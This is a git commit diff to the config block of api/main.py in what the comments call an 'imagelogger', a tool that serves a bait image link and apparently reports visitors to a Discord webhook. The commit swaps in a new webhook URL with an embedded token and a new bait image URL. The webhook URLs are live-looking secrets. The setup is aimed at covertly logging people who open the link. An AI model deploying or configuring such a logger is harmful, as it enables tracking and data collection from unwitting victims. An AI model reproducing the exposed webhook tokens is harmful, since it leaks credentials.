c53a3f0670a5f58a63382c567ffb061dd9124c9d
sennebakker3211-gif <senne.bakker3211@gmail.com>
2026-04-08 20:41:18 +0200

    main.py

--- api/main.py
+++ api/main.py
@@ -14,8 +14,8 @@ __author__ = "fishyramen"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1469081437859741904/Mhf8qAenyS_C8962tfVBAzVY0cH4xrcNcvX8HMysBfz5NW7Lfg6By9EVWHXHVd6F9Hwa",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1484577651833442324/13mb3_8xNMjuj4EQ89WpGmDtXlrZY0bktxB7HnHu0tnRIuCKfmBGINL_ocGz9ILJjUvd",
+    "image": "https://thumbs.dreamstime.com/b/r-214795421.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
